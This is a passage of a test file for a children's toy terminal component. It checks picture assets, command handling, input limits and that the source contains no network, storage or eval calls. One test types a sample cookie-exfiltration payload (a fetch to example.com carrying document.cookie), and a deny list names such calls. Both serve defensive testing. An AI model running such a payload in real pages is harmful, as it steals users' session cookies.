    expect(pictures.length).toBeGreaterThan(20);
    for (const picture of pictures) {
      expect(picture.src).toMatch(/^\/visuals\/studio-v2\/(bop|v30|makers)\/[a-z0-9-]+\.webp$/); expect(picture.width).toBeGreaterThan(0); expect(picture.source.length).toBeGreaterThan(10);
      expect(picture.src).not.toMatch(/bebe|gobgob|crew/);
    }
    // Four pictures are edited for this activity alone; companions, tools and the planter come from the Studio's shared kit library.
    const made = pictures.filter(picture => picture.src.includes('/makers/'));
    expect(made.filter(picture => !/\/kit-(aya|tool|prop)-[a-z-]+\.webp$/.test(picture.src)).map(picture => path.basename(picture.src)).sort()).toEqual(['maker-desk-bench-hd.webp', 'maker-desk-bench-lights.webp', 'maker-desk-bench.webp', 'maker-desk-room-wide.webp']);
    expect(made).toHaveLength(14);
    const publicDir = path.join(path.dirname(fileURLToPath(import.meta.url)), '../../../../../../../public');
    for (const picture of pictures) for (const src of [picture.src, picture.src480]) if (src) expect(readdirSync(path.join(publicDir, path.dirname(src))), src).toContain(path.basename(src));
  });
});

describe('Ask the computer: what is typed stays a toy', () => {
  const renderTerm = (onCommand = vi.fn()) => { h.cursor = 0; return DeskTerminal({ w: en, lang: 'en', things: ['bowl'], hello: { word: 'Hi', noName: 'Hi there!', name: null }, audio: h.audio as any, onCommand }); };
  const input = (tree: unknown) => find(tree, n => n.type === 'input', 'input');
  /** The lines on the pretend screen, as text. */
  const screen = (tree: unknown) => nodes(find(tree, n => n.props.role === 'log', 'log')).filter(n => n.props.line).map(n => JSON.stringify(n.props.line)).join('\n');
  it('runs the big command buttons and typed words through the fixed table only', () => {
    const onCommand = vi.fn();
    let tree = renderTerm(onCommand);
    expect(nodes(tree).filter(n => n.props['data-command']).map(n => n.props['data-command'])).toEqual(['help', 'ls', 'cat about.txt', 'hello', 'dance', 'sing', 'clear']);
    // A word key types its word into the prompt, letter by letter, then enters it.
    find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props.onClick!();
    expect(onCommand).not.toHaveBeenCalled(); vi.advanceTimersByTime(200); tree = renderTerm(onCommand);
    expect(input(tree).props.value).toBe('cat '); expect(find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props['data-down']).toBe(true);
    vi.advanceTimersByTime(1000);
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.about[0]); expect(onCommand).toHaveBeenLastCalledWith('cat about.txt', null); expect(onCommand).toHaveBeenCalledTimes(1);
    input(tree).props.onChange({ target: { value: 'fetch("https://example.com/?q=" + document.cookie)' } });
    input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() });
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.unknown); expect(onCommand).toHaveBeenLastCalledWith(null, null);
    expect(input(tree).props.value).toBe('');
    find(tree, n => n.props['data-command'] === 'clear', 'clear').props.onClick!(); vi.advanceTimersByTime(600);
    expect(screen(renderTerm(onCommand))).toBe('');
    // The typed words appear only as the echoed line on this component's own screen.
    expect(h.slots.some(slot => JSON.stringify(slot.value ?? '').includes('document.cookie'))).toBe(false);
  });
  it('a command can reach outside the screen only through its fixed effect, and plays its own sound', () => {
    const onCommand = vi.fn();
    const type = (text: string) => { input(renderTerm(onCommand)).props.onChange({ target: { value: text } }); input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() }); };
    type('lamp'); expect(onCommand).toHaveBeenLastCalledWith('lamp', 'lamp');
    type('sing'); expect(h.audio.song).toHaveBeenCalledTimes(1); expect(onCommand).toHaveBeenLastCalledWith('sing', null);
    type('abracadabra'); expect(h.audio.magic).toHaveBeenCalledTimes(1); expect(screen(renderTerm(onCommand))).toContain('"show":"starfall"');
    type('lamp on'); expect(onCommand).toHaveBeenLastCalledWith(null, null); expect(h.audio.hm).toHaveBeenCalledTimes(1);
  });
  it('Tab finishes a known word; with nothing to finish it lets focus move on', () => {
    let tree = renderTerm();
    input(tree).props.onChange({ target: { value: 'cat th' } }); tree = renderTerm();
    expect(nodes(tree).filter(n => n.props.className === 'md-chip').map(words)).toEqual(['cat things/bowl']);
    const tab = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(tree).props.onKeyDown(tab); expect(tab.preventDefault).toHaveBeenCalled(); expect(input(renderTerm()).props.value).toBe('cat things/bowl');
    input(renderTerm()).props.onChange({ target: { value: '' } });
    const free = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(renderTerm()).props.onKeyDown(free); expect(free.preventDefault).not.toHaveBeenCalled();
  });
  it('the input never keeps more than the toy reads', () => {
    const tree = renderTerm();
    expect(input(tree).props.maxLength).toBe(40); expect(input(tree).props.autoComplete).toBe('off'); expect(input(tree).props.spellCheck).toBe(false);
    input(tree).props.onChange({ target: { value: 'x'.repeat(200) } }); expect(input(renderTerm()).props.value).toHaveLength(40);
  });
});

describe('the Maker Desk source is a closed toy', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const files = readdirSync(here).filter(f => /\.(tsx?)$/.test(f) && !/\.test\.tsx?$/.test(f));
  const strip = (s: string) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');
  it('nothing evaluates, fetches, stores or sends what the child does', () => {
    expect(files).toContain('DeskTerminal.tsx'); expect(files).toContain('makerDeskRules.ts');
    const FORBIDDEN = [/\beval\s*\(/, /new\s+Function\b/, /\bFunction\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /WebSocket/, /EventSource/, /sendBeacon/, /localStorage/, /sessionStorage/, /indexedDB/, /document\.cookie/,
      /useChildCollection/, /\bimport\s*\(/, /dangerouslySetInnerHTML/, /innerHTML/, /postMessage/, /setTimeout\s*\(\s*['"`]/, /\.save\s*\(/, /\bkidSay\b/, /speakText/];
    for (const file of files) for (const pattern of FORBIDDEN) expect(pattern.test(strip(readFileSync(path.join(here, file), 'utf8'))), `${file}: ${pattern}`).toBe(false);
  });
  it('the rules module is pure: no React, no DOM, no clock', () => {
    const rules = strip(readFileSync(path.join(here, 'makerDeskRules.ts'), 'utf8'));
    for (const pattern of [/from 'react'/, /\bwindow\b/, /\bdocument\b/, /Date\.now|new Date/, /Math\.random/, /setTimeout|setInterval/]) expect(pattern.test(rules), String(pattern)).toBe(false);
  });
});
